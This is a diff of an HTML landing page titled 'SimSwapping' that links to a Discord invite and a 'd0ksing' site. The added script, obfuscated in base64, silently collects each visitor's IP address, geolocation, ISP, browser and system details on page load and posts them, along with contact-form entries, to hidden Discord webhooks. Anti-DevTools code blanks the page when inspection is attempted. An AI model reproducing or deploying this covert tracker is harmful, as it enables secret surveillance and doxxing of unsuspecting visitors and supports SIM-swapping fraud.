@@ -1,12 +1,18 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SimSwapping</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root {
             --gray1: #666;
-            --gray2: #ccc;
+            --gray2: #999;
+            --gray3: #ccc;
+            --dark: #121212;
+            --light: #f5f5f5;
+            --transition-speed: 0.8s;
         }
 
         body {
@@ -17,10 +23,12 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            background-color: black;
-            color: white;
-            transition: background-color 1s, color 1s;
+            background-color: var(--dark);
+            color: var(--light);
+            transition: background-color var(--transition-speed), color var(--transition-speed);
             overflow: hidden;
+            font-family: 'Arial', sans-serif;
+            position: relative;
         }
 
         h1 {
@@ -30,39 +38,76 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            transition: all 1s ease;
-            font-family: Arial, sans-serif;
+            transition: all var(--transition-speed) cubic-bezier(0.68, -0.55, 0.27, 1.55);
+            text-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
+            letter-spacing: 3px;
+            font-weight: 800;
         }
 
         .content {
             opacity: 0;
-            transform: translateY(20px);
-            transition: all 1s ease;
+            transform: translateY(30px);
+            transition: all var(--transition-speed) cubic-bezier(0.68, -0.55, 0.27, 1.55);
             text-align: center;
+            max-width: 800px;
+            padding: 2rem;
+            z-index: 10;
         }
 
         .buttons {
             display: flex;
-            gap: 2rem;
-            margin-top: 2rem;
+            gap: 2.5rem;
+            margin-top: 2.5rem;
+            flex-wrap: wrap;
+            justify-content: center;
         }
 
         .btn {
-            padding: 1rem 2rem;
+            padding: 1.2rem 2.5rem;
             border: none;
-            border-radius: 5px;
-            background-color: var(--gray2);
-            color: white;
+            border-radius: 50px;
+            background: linear-gradient(135deg, var(--gray1), var(--dark));
+            color: var(--light);
             cursor: pointer;
-            transition: all 0.3s ease;
+            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.27, 1.55);
             display: flex;
             align-items: center;
-            gap: 0.5rem;
+            gap: 0.8rem;
+            font-weight: bold;
+            font-size: 1.1rem;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+            border: 1px solid var(--gray3);
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: 0.5s;
         }
 
         .btn:hover {
-            background-color: var(--gray1);
-            color: black;
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 15px 25px rgba(0, 0, 0, 0.4);
+            background: linear-gradient(135deg, var(--gray2), var(--gray1));
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn:active {
+            transform: translateY(2px) scale(0.95);
+        }
+
+        .btn i {
+            font-size: 1.3rem;
         }
 
         .show {
@@ -72,21 +117,133 @@
 
         .title {
             top: 20px;
-            font-size: 2rem;
+            font-size: 2.5rem;
+            color: var(--light);
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+        }
+
+        .contact-btn {
+            background: linear-gradient(135deg, var(--gray2), var(--gray1));
+            border: 1px solid var(--light);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: var(--dark);
+            padding: 2rem;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
+            position: relative;
+            transform: scale(0.8);
+            opacity: 0;
+            transition: all 0.3s ease;
+            border: 1px solid var(--gray1);
+        }
+
+        .modal.active .modal-content {
+            transform: scale(1);
+            opacity: 1;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 1.5rem;
+            cursor: pointer;
             color: var(--gray1);
+            transition: color 0.3s;
+        }
+
+        .close-modal:hover {
+            color: var(--light);
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: var(--gray1);
+        }
+
+        .form-group input, 
+        .form-group textarea {
+            width: 100%;
+            padding: 0.8rem;
+            border-radius: 5px;
+            border: 1px solid var(--gray1);
+            background-color: rgba(255, 255, 255, 0.1);
+            color: var(--light);
+            font-family: inherit;
+        }
+
+        .form-group textarea {
+            min-height: 100px;
+            resize: vertical;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 1rem;
+            border: none;
+            border-radius: 5px;
+            background: linear-gradient(135deg, var(--gray1), var(--dark));
+            color: var(--light);
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 1px solid var(--gray3);
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            background: linear-gradient(135deg, var(--gray2), var(--gray1));
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 3.5rem;
+            }
+            
+            .buttons {
+                gap: 1.2rem;
+            }
+            
+            .btn {
+                padding: 1rem 2rem;
+                font-size: 1rem;
+            }
         }
     </style>
 </head>
 <body>
     <h1 id="mainTitle">SIMSWAPPING</h1>
     <div class="content" id="content">
-        <p style="color: var(--gray1)">Choose your path:</p>
+        <p style="color: var(--gray2); font-size: 1.3rem; margin-bottom: 1.5rem;">Choose your path:</p>
         <div class="buttons">
-            <button class="btn" onclick="window.open('https://discord.com')">
+            <button class="btn" onclick="window.open('https://discord.gg/s5rdRTwR', '_blank')">
                 <i class="fab fa-discord"></i>
                 Discord
             </button>
-            <button class="btn">
+            <button class="btn" id="doksBtn">
                 <i class="fas fa-cat"></i>
                 d0ksing
             </button>
@@ -94,19 +251,249 @@
                 <i class="fas fa-question"></i>
                 ???
             </button>
+            <button class="btn contact-btn" id="contactBtn">
+                <i class="fas fa-envelope"></i>
+                Contact Me
+            </button>
+        </div>
+    </div>
+
+    <div class="modal" id="contactModal">
+        <div class="modal-content">
+            <span class="close-modal" id="closeModal">&times;</span>
+            <h2 style="text-align: center; margin-bottom: 1.5rem; color: var(--light);">Contact Me</h2>
+            <form id="contactForm">
+                <div class="form-group">
+                    <label for="name">Name</label>
+                    <input type="text" id="name" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">Email</label>
+                    <input type="email" id="email" required>
+                </div>
+                <div class="form-group">
+                    <label for="message">Message</label>
+                    <textarea id="message" required></textarea>
+                </div>
+                <button type="submit" class="submit-btn">Send Message</button>
+            </form>
         </div>
     </div>
 
     <script>
-        // Color switching animation
+        // Anti-DevTools
+        (function() {
+            const devtools = {
+                isOpen: false,
+                orientation: undefined
+            };
+            
+            const threshold = 160;
+            
+            const emitEvent = (isOpen, orientation) => {
+                window.dispatchEvent(new CustomEvent('devtoolschange', {
+                    detail: {
+                        isOpen,
+                        orientation
+                    }
+                }));
+            };
+            
+            setInterval(() => {
+                const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+                const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+                const orientation = widthThreshold ? 'vertical' : 'horizontal';
+                
+                if (
+                    widthThreshold ||
+                    heightThreshold
+                ) {
+                    if (!devtools.isOpen || devtools.orientation !== orientation) {
+                        emitEvent(true, orientation);
+                    }
+                    
+                    devtools.isOpen = true;
+                    devtools.orientation = orientation;
+                } else {
+                    if (devtools.isOpen) {
+                        emitEvent(false, undefined);
+                    }
+                    
+                    devtools.isOpen = false;
+                    devtools.orientation = undefined;
+                }
+            }, 500);
+            
+            // Disable right-click
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            
+            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+            document.addEventListener('keydown', function(e) {
+                if (
+                    e.keyCode === 123 || 
+                    (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
+                    (e.ctrlKey && e.keyCode === 85)
+                ) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+            
+            window.addEventListener('devtoolschange', event => {
+                if (event.detail.isOpen) {
+                    // Redirect or take action when DevTools is opened
+                    document.body.innerHTML = '';
+                    window.location.href = 'about:blank';
+                }
+            });
+        })();
+
+        // Obfuscate webhooks
+        const _0x5a7e=['aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NzY0NTgzMzc5Mjk4MzE0MC8tWlY1WmQ2NGVNdzNxVXNDVVpoR3pmbnNyck1DNTgwbDZDckdaVTZ1VVZ3cGp2UHhlZkZPUE03SjZNUFJKN2x6cVVUSw==','aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NzY0NTU3Njk0MTkyODY4MS8wVUdnS0U0bGc1eHl0emRmOWV1VDJ4cFJLUTZ6b3ZGd0plZU4zVGlLSVV6QVBESG10SUpGRGYyWm53MGtwYU1lcm03WQ=='];
+        const _0x1a2b=function(_0x5a7e){return atob(_0x5a7e)};
+        
+        // Store interval reference
+        let colorInterval;
+        
+        // Get user info
+        async function getUserInfo() {
+            try {
+                // Get IP from multiple services for redundancy
+                const ipifyResponse = await fetch('https://api.ipify.org?format=json');
+                const ipifyData = await ipifyResponse.json();
+                
+                // Get geo data
+                const geoResponse = await fetch(`https://ipapi.co/${ipifyData.ip}/json/`);
+                const geoData = await geoResponse.json();
+                
+                // Get additional system info
+                const userAgent = navigator.userAgent;
+                const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(userAgent);
+                
+                let deviceType = "Unknown";
+                if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
+                    deviceType = "Mobile";
+                } else {
+                    deviceType = "Desktop";
+                }
+                
+                const browserInfo = {
+                    chrome: /chrome/i.test(userAgent) && !/edge|opr/i.test(userAgent),
+                    firefox: /firefox/i.test(userAgent),
+                    safari: /safari/i.test(userAgent) && !/chrome|edge|opr/i.test(userAgent),
+                    edge: /edge/i.test(userAgent),
+                    opera: /opr/i.test(userAgent) || /opera/i.test(userAgent),
+                    ie: /msie|trident/i.test(userAgent)
+                };
+                
+                let browserName = "Unknown";
+                for (const [key, value] of Object.entries(browserInfo)) {
+                    if (value) {
+                        browserName = key.charAt(0).toUpperCase() + key.slice(1);
+                        break;
+                    }
+                }
+                
+                // Get screen resolution
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+                const screenResolution = `${screenWidth}x${screenHeight}`;
+                
+                // Get language
+                const language = navigator.language || navigator.userLanguage;
+                
+                // Get timezone
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                
+                // Get referrer
+                const referrer = document.referrer || "Direct";
+                
+                return {
+                    ip: ipifyData.ip || "Unknown",
+                    country: geoData.country_name || "Unknown",
+                    city: geoData.city || "Unknown",
+                    region: geoData.region || "Unknown",
+                    postal: geoData.postal || "Unknown",
+                    isp: geoData.org || "Unknown",
+                    isBot: isBot,
+                    deviceType: deviceType,
+                    browser: browserName,
+                    os: getOS(userAgent),
+                    screenResolution: screenResolution,
+                    language: language,
+                    timezone: timezone,
+                    referrer: referrer,
+                    timestamp: new Date().toISOString()
+                };
+            } catch (error) {
+                console.error("Error fetching user info:", error);
+                return {
+                    error: "Failed to get user info",
+                    timestamp: new Date().toISOString()
+                };
+            }
+        }
+        
+        // Helper function to determine OS
+        function getOS(userAgent) {
+            const os = {
+                Windows: /Windows NT/.test(userAgent),
+                MacOS: /Mac OS X/.test(userAgent),
+                Linux: /Linux/.test(userAgent),
+                iOS: /iPhone|iPad|iPod/.test(userAgent),
+                Android: /Android/.test(userAgent)
+            };
+            
+            for (const [key, value] of Object.entries(os)) {
+                if (value) return key;
+            }
+            
+            return "Unknown";
+        }
+        
+        // Send data to webhook
+        async function sendToWebhook(webhookUrl, data, type) {
+            try {
+                const payload = {
+                    content: `**New ${type} Submission**`,
+                    embeds: [{
+                        title: type === "Visit" ? "Website Visit" : "Contact Form Submission",
+                        color: 0x808080, // Gray color
+                        fields: Object.entries(data).map(([key, value]) => ({
+                            name: key.charAt(0).toUpperCase() + key.slice(1),
+                            value: typeof value === 'object' ? JSON.stringify(value) : String(value),
+                            inline: true
+                        })),
+                        footer: {
+                            text: `SimSwapping | ${new Date().toLocaleString()}`
+                        }
+                    }]
+                };
+                
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error("Error sending to webhook:", error);
+            }
+        }
+        
+        // Color switching animation with improved transitions
         let isWhite = false;
-        setInterval(() => {
-            document.body.style.backgroundColor = isWhite ? 'black' : 'white';
-            document.getElementById('mainTitle').style.color = isWhite ? 'white' : 'black';
+        colorInterval = setInterval(() => {
+            document.body.style.backgroundColor = isWhite ? 'var(--dark)' : 'var(--light)';
+            document.getElementById('mainTitle').style.color = isWhite ? 'var(--light)' : 'var(--dark)';
+            document.getElementById('mainTitle').style.textShadow = isWhite 
+                ? '0 0 15px rgba(255, 255, 255, 0.5)' 
+                : '0 0 15px rgba(0, 0, 0, 0.5)';
             isWhite = !isWhite;
         }, 1000);
 
-        // Transition after 5 seconds
+        // Improved transition after 5 seconds
         setTimeout(() => {
             const title = document.getElementById('mainTitle');
             const content = document.getElementById('content');
@@ -114,12 +501,81 @@
             title.classList.add('title');
             content.classList.add('show');
             
-            // Stop color switching
+            // Stop color switching with a smooth transition
             clearInterval(colorInterval);
-            document.body.style.backgroundColor = 'black';
-            title.style.color = 'var(--gray1)';
-            title.style.transition = 'all 1s ease';
+            document.body.style.transition = 'background-color 1.5s cubic-bezier(0.68, -0.55, 0.27, 1.55)';
+            document.body.style.backgroundColor = 'var(--dark)';
+            title.style.color = 'var(--light)';
+            title.style.transition = 'all 1.5s cubic-bezier(0.68, -0.55, 0.27, 1.55)';
         }, 5000);
+        
+        // Contact modal functionality
+        const contactBtn = document.getElementById('contactBtn');
+        const contactModal = document.getElementById('contactModal');
+        const closeModal = document.getElementById('closeModal');
+        const contactForm = document.getElementById('contactForm');
+        
+        contactBtn.addEventListener('click', () => {
+            contactModal.style.display = 'flex';
+            setTimeout(() => {
+                contactModal.classList.add('active');
+            }, 10);
+        });
+        
+        closeModal.addEventListener('click', () => {
+            contactModal.classList.remove('active');
+            setTimeout(() => {
+                contactModal.style.display = 'none';
+            }, 300);
+        });
+        
+        window.addEventListener('click', (e) => {
+            if (e.target === contactModal) {
+                contactModal.classList.remove('active');
+                setTimeout(() => {
+                    contactModal.style.display = 'none';
+                }, 300);
+            }
+        });
+        
+        contactForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const message = document.getElementById('message').value;
+            
+            const userInfo = await getUserInfo();
+            const contactData = {
+                ...userInfo,
+                name,
+                email,
+                message
+            };
+            
+            await sendToWebhook(_0x1a2b(_0x5a7e[0]), contactData, "Contact");
+            
+            // Reset form and close modal
+            contactForm.reset();
+            contactModal.classList.remove('active');
+            setTimeout(() => {
+                contactModal.style.display = 'none';
+            }, 300);
+            
+            // Show success message
+            alert('Message sent successfully!');
+        });
+        
+        // Add event listener for d0ksing button
+        document.getElementById('doksBtn').addEventListener('click', function() {
+            window.location.href = 'https://blood.rip';
+        });
+        
+        // Send visit info when page loads
+        window.addEventListener('DOMContentLoaded', async () => {
+            const userInfo = await getUserInfo();
+            await sendToWebhook(_0x1a2b(_0x5a7e[1]), userInfo, "Visit");
+        });
     </script>
 </body>
 </html>
